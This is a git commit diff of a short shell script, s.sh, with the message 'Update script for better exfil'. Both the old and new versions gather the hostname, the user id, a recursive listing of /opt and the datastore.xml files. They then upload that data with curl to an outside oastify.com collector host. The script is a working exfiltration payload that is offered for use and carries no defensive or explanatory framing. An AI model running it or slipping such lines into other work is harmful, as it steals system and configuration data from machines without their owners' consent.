e92fa943665e69a095d818976fc469136cc15745
Mohamed Omar Salama Abdelkader <medo.omar.salama@gmail.com>
2026-03-16 01:49:53 +0200

    Update script for better exfil

--- s.sh
+++ s.sh
@@ -1,7 +1,11 @@
 #!/bin/sh
-id > /tmp/id
-hostname >> /tmp/id
-ls -R /opt >> /tmp/id
-curl -F f=@/tmp/id http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/verify
-find /opt -name datastore.xml -exec curl -F f=@{} http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/ds \;
-find /var/lib -name datastore.xml -exec curl -F f=@{} http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/ds \;
+echo "--- HOSTNAME ---" > /tmp/out
+hostname >> /tmp/out
+echo "--- ID ---" >> /tmp/out
+id >> /tmp/out
+echo "--- LS /OPT ---" >> /tmp/out
+ls -R /opt >> /tmp/out 2>&1
+echo "--- DATASTORE FILES ---" >> /tmp/out
+find /opt -name datastore.xml >> /tmp/out 2>&1
+echo "--- EXFILTRATING ---" >> /tmp/out
+curl -F f=@/tmp/out http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/final
